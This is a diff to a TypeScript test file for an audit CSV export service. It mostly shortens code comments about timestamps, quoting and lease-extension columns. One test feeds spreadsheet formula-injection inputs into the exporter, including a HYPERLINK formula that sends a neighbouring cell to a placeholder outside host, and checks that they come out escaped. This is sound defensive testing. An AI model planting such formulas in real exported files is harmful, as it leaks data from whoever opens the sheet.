@@ -78,8 +78,7 @@ describe("AuditExportService", () => {
       });
     });
 
-    // The file outlives the session that produced it, so the instant is written in full rather than in the
-    // exporter's own zone the way the Time column renders it.
+    // The file outlives the session, so the instant is written in full, not the exporter's own zone.
     it("writes the timestamp as a full ISO 8601 instant", () => {
       const exported = service.toAuditExport(
         row({ occurredAt: new Date("2026-01-05T23:30:15.250Z") }),
@@ -133,8 +132,7 @@ describe("AuditExportService", () => {
       expect(JSON.stringify(exported)).not.toMatch(/null|undefined/);
     });
 
-    // Cipher and collection names come from local vault state, so an item the exporter cannot decrypt has
-    // none. The empty cell is the correct answer: the response's encrypted names are not a fallback.
+    // Names come from local vault state; an item the exporter can't decrypt has none, correctly.
     it("leaves the item empty for a row whose item did not resolve", () => {
       const exported = service.toAuditExport(row({ cipherName: null, collectionName: null }));
 
@@ -151,8 +149,7 @@ describe("AuditExportService", () => {
       expect(exported.grantedDuration).toBe("1 hour");
     });
 
-    // A LeaseExtended event carries no granted window, so without its own column the one datum the event
-    // exists to record would not reach the file at all.
+    // A LeaseExtended event carries no granted-window field of its own.
     it("writes the new lease end for an extension, which carries no duration", () => {
       const exported = service.toAuditExport(
         row({
@@ -180,8 +177,8 @@ describe("AuditExportService", () => {
       expect(parsed.data.map((record) => record.detail)).toEqual(["first", "second", "third"]);
     });
 
-    // Approver comments are free text: a comment carrying the delimiter, a quote or a line break has to
-    // survive the round trip rather than shift every later column.
+    // Free text; a delimiter, quote or line break must survive the round trip without shifting
+    // later columns.
     it("quotes a detail containing a comma, a double quote and a newline", () => {
       const detail = 'Approved, but "read-only"\nper the incident notes';
 
@@ -194,9 +191,8 @@ describe("AuditExportService", () => {
       expect(parsed.data[0].event).toBe("Lease activated");
     });
 
-    // A denial reason is free text written by someone other than the auditor who opens the file. Left
-    // as it was typed, a leading trigger makes the cell a formula the spreadsheet runs on open — the
-    // usual shape being a HYPERLINK that carries a neighbouring cell off to another host.
+    // Free text from someone other than the file's opener; a leading trigger character would make
+    // the cell a formula the spreadsheet runs on open.
     it.each([
       ["=", '=HYPERLINK("http://example.test/"&A1,"click")'],
       ["+", "+1+1"],
@@ -212,7 +208,7 @@ describe("AuditExportService", () => {
       expect(parsed.data[0].detail).toBe(`'${detail}`);
     });
 
-    // The escape is an escape, not a redaction: the auditor has to read the comment that was left.
+    // An escape, not a redaction; the original text is still there to read.
     it("keeps the original text behind the escape", () => {
       const detail = "=1+1";
 
@@ -232,8 +228,6 @@ describe("AuditExportService", () => {
       expect(parsed.data[0].itemName).toBe("'@SUM(1,1)");
     });
 
-    // An ordinary value must reach the file unchanged, or every cell an auditor reads carries a mark
-    // that was never in the record.
     it("writes an ordinary value through untouched", () => {
       const parsed = papa.parse<Record<string, string>>(service.getAuditExport([row()]), {
         header: true,
